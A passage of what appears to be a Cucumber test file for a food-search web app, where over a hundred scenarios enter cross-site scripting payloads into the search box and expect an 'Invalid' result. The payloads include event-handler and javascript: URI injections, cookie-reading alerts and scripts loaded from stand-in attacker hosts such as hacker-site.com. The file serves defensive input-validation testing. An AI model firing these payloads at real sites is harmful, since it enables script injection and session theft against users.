		When I enter "'>><marquee><h1>XSS</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S310 XSS Test 310

		When I enter "'\">><script>alert('XSS')</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S311 XSS Test 311

		When I enter "'\">><marquee><h1>XSS</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S312 XSS Test 312

		When I enter "<META HTTP-EQUIV=\\"refresh\\" CONTENT=\\"0;url=javascript:alert('XSS');\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S313 XSS Test 313

		When I enter "<META HTTP-EQUIV=\\"refresh\\" CONTENT=\\"0; URL=http://;URL=javascript:alert('XSS');\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S314 XSS Test 314

		When I enter "<script>var var = 1; alert(var)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S315 XSS Test 315

		When I enter "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S316 XSS Test 316

		When I enter "<?='<SCRIPT>alert(\"XSS\")</SCRIPT>'?>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S317 XSS Test 317

		When I enter "<IMG SRC='vbscript:msgbox(\\"XSS\\")'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S318 XSS Test 318

		When I enter "\" onfocus=alert(document.domain) \"> <\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S319 XSS Test 319

		When I enter "<FRAMESET><FRAME SRC=\\"javascript:alert('XSS');\\"></FRAMESET>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S320 XSS Test 320

		When I enter "<STYLE>li {list-style-image: url(\\"javascript:alert('XSS')\\");}</STYLE><UL><LI>XSS" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S321 XSS Test 321

		When I enter "perl -e 'print \\"<SCR\0IPT>alert(\\"XSS\\")</SCR\0IPT>\\";' > out" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S322 XSS Test 322

		When I enter "perl -e 'print \\"<IMG SRC=java\0script:alert(\\"XSS\\")>\\";' > out" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S323 XSS Test 323

		When I enter "<br size=\\"&{alert('XSS')}\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S324 XSS Test 324

		When I enter "<scrscriptipt>alert(1)</scrscriptipt>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S325 XSS Test 325

		When I enter "</br style=a:expression(alert())>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S326 XSS Test 326

		When I enter "</script><script>alert(1)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S327 XSS Test 327

		When I enter "\"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S328 XSS Test 328

		When I enter "[color=red width=expression(alert(123))][color]" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S329 XSS Test 329

		When I enter "<BASE HREF=\"javascript:alert('XSS');//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S330 XSS Test 330

		When I enter "Execute(MsgBox(chr(88)&chr(83)&chr(83)))<" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S331 XSS Test 331

		When I enter "\"></iframe><script>alert(123)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S332 XSS Test 332

		When I enter "<body onLoad=\"while(true) alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S333 XSS Test 333

		When I enter "'\"></title><script>alert(1111)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S334 XSS Test 334

		When I enter "</textarea>'\"><script>alert(document.cookie)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S335 XSS Test 335

		When I enter "'\"\"><script language=\"JavaScript\"> alert('X \nS \nS');</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S336 XSS Test 336

		When I enter "</script></script><<<<script><>>>><<<script>alert(123)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S337 XSS Test 337

		When I enter "<html><noalert><noscript>(123)</noscript><script>(123)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S338 XSS Test 338

		When I enter "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S339 XSS Test 339

		When I enter "'></select><script>alert(123)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S340 XSS Test 340

		When I enter "'>\"><script src = 'http://www.site.com/XSS.js'></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S341 XSS Test 341

		When I enter "}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S342 XSS Test 342

		When I enter "<SCRIPT>document.write(\"XSS\");</SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S343 XSS Test 343

		When I enter "a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('xss');\";eval(a+b+c+d);" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S344 XSS Test 344

		When I enter "='><script>alert(\"xss\")</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S345 XSS Test 345

		When I enter "<script+src=\">\"+src=\"http://yoursite.com/xss.js?69,69\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S346 XSS Test 346

		When I enter "<body background=javascript:'\"><script>alert(navigator.userAgent)</script>></body>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S347 XSS Test 347

		When I enter "\">/XaDoS/><script>alert(document.cookie)</script><script src=\"http://www.site.com/XSS.js\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S348 XSS Test 348

		When I enter "\">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S349 XSS Test 349

		When I enter "src=\"http://www.site.com/XSS.js\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S350 XSS Test 350

		When I enter "data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S351 XSS Test 351

		When I enter "!--\" /><script>alert('xss');</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S352 XSS Test 352

		When I enter "<script>alert(\"XSS by \nxss\")</script><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S353 XSS Test 353

		When I enter "\"><script>alert(\"XSS by \nxss\")</script>><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S354 XSS Test 354

		When I enter "'\"></title><script>alert(\"XSS by \nxss\")</script>><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S355 XSS Test 355

		When I enter "<img \"\"\"><script>alert(\"XSS by \nxss\")</script><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S356 XSS Test 356

		When I enter "<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S357 XSS Test 357

		When I enter "\"><script>alert(1337)</script>\"><script>alert(\"XSS by \nxss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S358 XSS Test 358

		When I enter "'\"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S359 XSS Test 359

		When I enter "<iframe src=\"javascript:alert('XSS by \nxss');\"></iframe><marquee><h1>XSS by xss</h1></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S360 XSS Test 360

		When I enter "'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt='" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S361 XSS Test 361

		When I enter "\"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S362 XSS Test 362

		When I enter "\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\'" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S363 XSS Test 363

		When I enter "http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S364 XSS Test 364

		When I enter "http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S365 XSS Test 365

		When I enter "'); alert('xss'); var x='" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S366 XSS Test 366

		When I enter "\\'); alert(\'xss\');var x=\'" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S367 XSS Test 367

		When I enter "//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S368 XSS Test 368

		When I enter ">\"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S369 XSS Test 369

		When I enter "<img src=\"Mario Heiderich says that svg SHOULD not be executed trough image tags\" onerror=\"javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');\"></img>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S370 XSS Test 370

		When I enter "</body>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S371 XSS Test 371

		When I enter "</html>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S372 XSS Test 372

		When I enter "<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S373 XSS Test 373

		When I enter "<SCRIPT> alert(“XSS”); </SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S374 XSS Test 374

		When I enter "<BODY ONLOAD=alert(\"XSS\")>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S375 XSS Test 375

		When I enter "<BODY BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S376 XSS Test 376

		When I enter "<IMG SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S377 XSS Test 377

		When I enter "<IMG DYNSRC=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S378 XSS Test 378

		When I enter "<IMG LOWSRC=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S379 XSS Test 379

		When I enter "<IFRAME SRC=”http://hacker-site.com/xss.html”>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S380 XSS Test 380

		When I enter "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S381 XSS Test 381

		When I enter "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S382 XSS Test 382

		When I enter "<TABLE BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S383 XSS Test 383

		When I enter "<TD BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S384 XSS Test 384

		When I enter "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S385 XSS Test 385

		When I enter "<DIV STYLE=\"width: expression(alert('XSS'));\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S386 XSS Test 386

		When I enter "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://hacker.com/xss.html\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S387 XSS Test 387

		When I enter "<EMBED SRC=\"http://hacker.com/xss.swf\" AllowScriptAccess=\"always\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S388 XSS Test 388

		When I enter "&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S389 XSS Test 389

		When I enter "&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S390 XSS Test 390

		When I enter "&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S391 XSS Test 391

		When I enter "&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S392 XSS Test 392

		When I enter "&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S393 XSS Test 393

		When I enter "&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S394 XSS Test 394

		When I enter "&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S395 XSS Test 395

		When I enter "&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S396 XSS Test 396

		When I enter "&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S397 XSS Test 397

		When I enter "&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S398 XSS Test 398

		When I enter "&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S399 XSS Test 399

		When I enter "&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S400 XSS Test 400

		When I enter "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S401 XSS Test 401

		When I enter "<IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S402 XSS Test 402

		When I enter "<IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S403 XSS Test 403

		When I enter "<IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S404 XSS Test 404

		When I enter "<IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S405 XSS Test 405

		When I enter "<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S406 XSS Test 406

		When I enter "<IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S407 XSS Test 407

		When I enter "<IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S408 XSS Test 408

		When I enter "<IMG SRC=x onmessage=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S409 XSS Test 409

		When I enter "<IMG SRC=x ononline=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S410 XSS Test 410

		When I enter "<IMG SRC=x onoffline=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S411 XSS Test 411

		When I enter "<IMG SRC=x onpagehide=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S412 XSS Test 412

		When I enter "<IMG SRC=x onpageshow=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S413 XSS Test 413

		When I enter "<IMG SRC=x onpopstate=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S414 XSS Test 414

		When I enter "<IMG SRC=x onresize=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S415 XSS Test 415

		When I enter "<IMG SRC=x onstorage=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S416 XSS Test 416

		When I enter "<IMG SRC=x onunload=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S417 XSS Test 417

		When I enter "<IMG SRC=x onblur=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S418 XSS Test 418

		When I enter "<IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S419 XSS Test 419

		When I enter "<IMG SRC=x oncontextmenu=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S420 XSS Test 420

		When I enter "<IMG SRC=x oninput=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S421 XSS Test 421

		When I enter "<IMG SRC=x oninvalid=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S422 XSS Test 422

		When I enter "<IMG SRC=x onreset=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S423 XSS Test 423

		When I enter "<IMG SRC=x onsearch=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S424 XSS Test 424

		When I enter "<IMG SRC=x onselect=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S425 XSS Test 425

		When I enter "<IMG SRC=x onsubmit=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S426 XSS Test 426

		When I enter "<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S427 XSS Test 427

		When I enter "<IMG SRC=x onkeypress=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S428 XSS Test 428

		When I enter "<IMG SRC=x onkeyup=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S429 XSS Test 429

		When I enter "<IMG SRC=x onclick=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S430 XSS Test 430

		When I enter "<IMG SRC=x ondblclick=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S431 XSS Test 431

		When I enter "<IMG SRC=x onmousedown=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S432 XSS Test 432

		When I enter "<IMG SRC=x onmousemove=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S433 XSS Test 433

		When I enter "<IMG SRC=x onmouseout=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S434 XSS Test 434

		When I enter "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S435 XSS Test 435

		When I enter "<IMG SRC=x onmouseup=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S436 XSS Test 436

		When I enter "<IMG SRC=x onmousewheel=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S437 XSS Test 437

		When I enter "<IMG SRC=x onwheel=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S438 XSS Test 438

		When I enter "<IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S439 XSS Test 439

		When I enter "<IMG SRC=x ondragend=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S440 XSS Test 440

		When I enter "<IMG SRC=x ondragenter=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S441 XSS Test 441

		When I enter "<IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S442 XSS Test 442

		When I enter "<IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S443 XSS Test 443

		When I enter "<IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S444 XSS Test 444

		When I enter "<IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S445 XSS Test 445

		When I enter "<IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S446 XSS Test 446

		When I enter "<IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S447 XSS Test 447

		When I enter "<IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S448 XSS Test 448

